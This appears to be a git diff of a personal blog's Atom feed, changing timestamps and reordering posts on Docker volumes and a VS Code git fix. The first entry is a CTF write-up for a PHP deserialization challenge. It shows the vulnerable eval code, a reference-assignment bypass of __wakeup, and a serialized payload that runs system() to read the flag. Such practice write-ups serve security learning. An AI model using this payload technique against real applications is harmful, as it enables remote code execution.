@@ -6,7 +6,7 @@
   <link href="https://github.com/Eviden0/new-webpage/atom.xml" rel="self"/>
   
   <link href="https://github.com/Eviden0/new-webpage/"/>
-  <updated>2024-06-12T14:00:58.034Z</updated>
+  <updated>2024-06-12T14:02:34.996Z</updated>
   <id>https://github.com/Eviden0/new-webpage/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://github.com/Eviden0/new-webpage/posts/db1d0201.html"/>
     <id>https://github.com/Eviden0/new-webpage/posts/db1d0201.html</id>
     <published>2024-06-12T13:50:00.000Z</published>
-    <updated>2024-06-12T14:00:58.034Z</updated>
+    <updated>2024-06-12T14:02:34.996Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p><a href="https://www.nssctf.cn/problem/3095">UUCTF 2022 新生赛]ez_unser | NSSCTF</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">NSSCTF&#123;This_iS_SO_SO_SO_EASY&#125;</span><br></pre></td></tr></table></figure><p>讨人厌的waf<code>if(!preg_match(&#39;/test&quot;:3/i&#39;,$a))</code>,这里写死了反序列化后的成员数量,让你无法绕过wakeup()魔法,必定触发<code>$this-&gt;a=&#39;&#39;;</code>然后不能命令执行了.</p><p>这样我们选择一手<code>金蝉脱壳</code>运用引用赋值,将b和a的引用指向同一个地方,<code>这样也就能让b和a的值同时变化</code>,题中只对a的值做变化,而其引用b的地址没变,<code>进而通过控制c控制b的值然后a和b一个引用</code>,因此仍然是可以命令执行的.</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=&amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;b=&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;;</span></span><br><span class="line">        <span class="comment">// $this-&gt;c=&#x27;123&#x27;;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"> <span class="comment">//O:4:&quot;test&quot;:4:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:33:&quot;system(&#x27;cat /fffffffffflagafag&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
     
@@ -137,6 +137,26 @@
   </entry>
   
   <entry>
+    <title>vscode 提交git一直卡着转圈圈</title>
+    <link href="https://github.com/Eviden0/new-webpage/posts/38f255c6.html"/>
+    <id>https://github.com/Eviden0/new-webpage/posts/38f255c6.html</id>
+    <published>2024-06-09T01:42:56.188Z</published>
+    <updated>2024-06-09T01:42:56.188Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>打开设置<br>把use Editor As commit input的勾选框去掉，ok，重新提交就可以了 。在commit却不添加任何消息时，勾选了这个会默认生成一个文件来替代消息并提交，而服务器无法接受这样的消息</strong><br><img src="https://s1.vika.cn/space/2024/03/28/d6d3efc6e6ae469194bb020bd3848e80" alt=""></p><p>取消勾选后重启<br><img src="https://s1.vika.cn/space/2024/03/28/c1be662048a4472aa0cf7e8fec7b5cdb" alt=""><br>成功!</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;打开设置&lt;br&gt;把use Editor As commit input的勾选框去掉，ok，重新提交就可以了 。在commit却不添加任何消息时，勾选了这个会默认生成一个文件来替代消息并提交，而服务器无法接受这样的消息&lt;/strong&gt;&lt;br&gt;&lt;img src</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>Termux安卓机实现内网穿透</title>
     <link href="https://github.com/Eviden0/new-webpage/posts/91facb7b.html"/>
     <id>https://github.com/Eviden0/new-webpage/posts/91facb7b.html</id>
@@ -154,26 +174,6 @@
     
     
     <category term="Linux" scheme="https://github.com/Eviden0/new-webpage/tags/Linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vscode 提交git一直卡着转圈圈</title>
-    <link href="https://github.com/Eviden0/new-webpage/posts/38f255c6.html"/>
-    <id>https://github.com/Eviden0/new-webpage/posts/38f255c6.html</id>
-    <published>2024-06-09T01:42:56.188Z</published>
-    <updated>2024-06-09T01:42:56.188Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>打开设置<br>把use Editor As commit input的勾选框去掉，ok，重新提交就可以了 。在commit却不添加任何消息时，勾选了这个会默认生成一个文件来替代消息并提交，而服务器无法接受这样的消息</strong><br><img src="https://s1.vika.cn/space/2024/03/28/d6d3efc6e6ae469194bb020bd3848e80" alt=""></p><p>取消勾选后重启<br><img src="https://s1.vika.cn/space/2024/03/28/c1be662048a4472aa0cf7e8fec7b5cdb" alt=""><br>成功!</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;打开设置&lt;br&gt;把use Editor As commit input的勾选框去掉，ok，重新提交就可以了 。在commit却不添加任何消息时，勾选了这个会默认生成一个文件来替代消息并提交，而服务器无法接受这样的消息&lt;/strong&gt;&lt;br&gt;&lt;img src</summary>
-      
-    
-    
-    
     
   </entry>
   
@@ -199,16 +199,16 @@
   </entry>
   
   <entry>
-    <title>docker05</title>
-    <link href="https://github.com/Eviden0/new-webpage/posts/fe873f53.html"/>
-    <id>https://github.com/Eviden0/new-webpage/posts/fe873f53.html</id>
+    <title>docker4</title>
+    <link href="https://github.com/Eviden0/new-webpage/posts/5b239192.html"/>
+    <id>https://github.com/Eviden0/new-webpage/posts/5b239192.html</id>
     <published>2024-06-09T01:42:56.185Z</published>
     <updated>2024-06-09T01:42:56.185Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="具名挂载和匿名挂载"><a href="#具名挂载和匿名挂载" class="headerlink" title="具名挂载和匿名挂载"></a>具名挂载和匿名挂载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匿名挂载</span></span><br><span class="line">- +容器内路径!</span><br><span class="line">docker run -d -p --name -nginx01 -v /etc/nginx nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有的olume 的情况</span></span><br><span class="line">docker volume ls </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里发现是匿名挂载,显示的挂载<span class="built_in">id</span>为一串随机数码,因为我们在-v 只写了容器内的路径,而没有写容器外的路径! 相当于是docker 给我们挂载到宿主机中一个默认的位置并且给了个默认的随机<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看</span></span><br><span class="line">docker volume ls </span><br><span class="line">发现挂载名字为`juming-nginx`</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/29/08d1ea3539c44a018609113082a055d5" alt=""></p><p><img src="https://s1.vika.cn/space/2024/03/29/e7e5547e3fc74a0b80c65763edc360ea" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<h3 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h3><hr><p>什么是容器数据卷 ?</p><p>将应用和环境打包成一个镜像.</p><p>如果数据都在容器中,我们删除容器后,数据就会丢失?</p><p>需求:数据可以持久化. Mysql 数据存储在本地!</p><p>容器之间可以有一个数据共享的技术,Docker容器中产生的数据,同步到本地就是卷技术,将我们容器的目录挂在到linux上面!</p><p><img src="https://s1.vika.cn/space/2024/03/28/2859a09acc424db4951b6786499cff0b" alt=""></p><p><strong>容器的持久化和同步操作,同时容器间也可以数据共享的!</strong></p><h3 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h3><blockquote><p>方式一: 直接使用命令进行挂载 -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器目录</span><br><span class="line">实例: docker run -it -v /home/eviden:/home centos /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看容器信息</span></span><br><span class="line">docker inspect +id </span><br><span class="line">找到`Mounts`那一栏可以看到具体挂载信息</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/28/49c605e356c54bc883d8b570e6283c84" alt=""></p><h3 id="实战-安装Mysql"><a href="#实战-安装Mysql" class="headerlink" title="实战,安装Mysql"></a>实战,安装Mysql</h3><p><img src="https://s1.vika.cn/space/2024/03/28/6be40ecaee2d4a8db8a99fdd5559c3cd" alt=""></p>]]></content>
     
     
-    <summary type="html">具名挂载和匿名挂载</summary>
+    <summary type="html">docker容器数据卷</summary>
     
     
     
@@ -220,16 +220,16 @@
   </entry>
   
   <entry>
-    <title>docker4</title>
-    <link href="https://github.com/Eviden0/new-webpage/posts/5b239192.html"/>
-    <id>https://github.com/Eviden0/new-webpage/posts/5b239192.html</id>
+    <title>docker05</title>
+    <link href="https://github.com/Eviden0/new-webpage/posts/fe873f53.html"/>
+    <id>https://github.com/Eviden0/new-webpage/posts/fe873f53.html</id>
     <published>2024-06-09T01:42:56.185Z</published>
     <updated>2024-06-09T01:42:56.185Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h3><hr><p>什么是容器数据卷 ?</p><p>将应用和环境打包成一个镜像.</p><p>如果数据都在容器中,我们删除容器后,数据就会丢失?</p><p>需求:数据可以持久化. Mysql 数据存储在本地!</p><p>容器之间可以有一个数据共享的技术,Docker容器中产生的数据,同步到本地就是卷技术,将我们容器的目录挂在到linux上面!</p><p><img src="https://s1.vika.cn/space/2024/03/28/2859a09acc424db4951b6786499cff0b" alt=""></p><p><strong>容器的持久化和同步操作,同时容器间也可以数据共享的!</strong></p><h3 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h3><blockquote><p>方式一: 直接使用命令进行挂载 -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器目录</span><br><span class="line">实例: docker run -it -v /home/eviden:/home centos /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看容器信息</span></span><br><span class="line">docker inspect +id </span><br><span class="line">找到`Mounts`那一栏可以看到具体挂载信息</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/28/49c605e356c54bc883d8b570e6283c84" alt=""></p><h3 id="实战-安装Mysql"><a href="#实战-安装Mysql" class="headerlink" title="实战,安装Mysql"></a>实战,安装Mysql</h3><p><img src="https://s1.vika.cn/space/2024/03/28/6be40ecaee2d4a8db8a99fdd5559c3cd" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<h3 id="具名挂载和匿名挂载"><a href="#具名挂载和匿名挂载" class="headerlink" title="具名挂载和匿名挂载"></a>具名挂载和匿名挂载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匿名挂载</span></span><br><span class="line">- +容器内路径!</span><br><span class="line">docker run -d -p --name -nginx01 -v /etc/nginx nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有的olume 的情况</span></span><br><span class="line">docker volume ls </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里发现是匿名挂载,显示的挂载<span class="built_in">id</span>为一串随机数码,因为我们在-v 只写了容器内的路径,而没有写容器外的路径! 相当于是docker 给我们挂载到宿主机中一个默认的位置并且给了个默认的随机<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看</span></span><br><span class="line">docker volume ls </span><br><span class="line">发现挂载名字为`juming-nginx`</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/29/08d1ea3539c44a018609113082a055d5" alt=""></p><p><img src="https://s1.vika.cn/space/2024/03/29/e7e5547e3fc74a0b80c65763edc360ea" alt=""></p>]]></content>
     
     
-    <summary type="html">docker容器数据卷</summary>
+    <summary type="html">具名挂载和匿名挂载</summary>
     
     
     
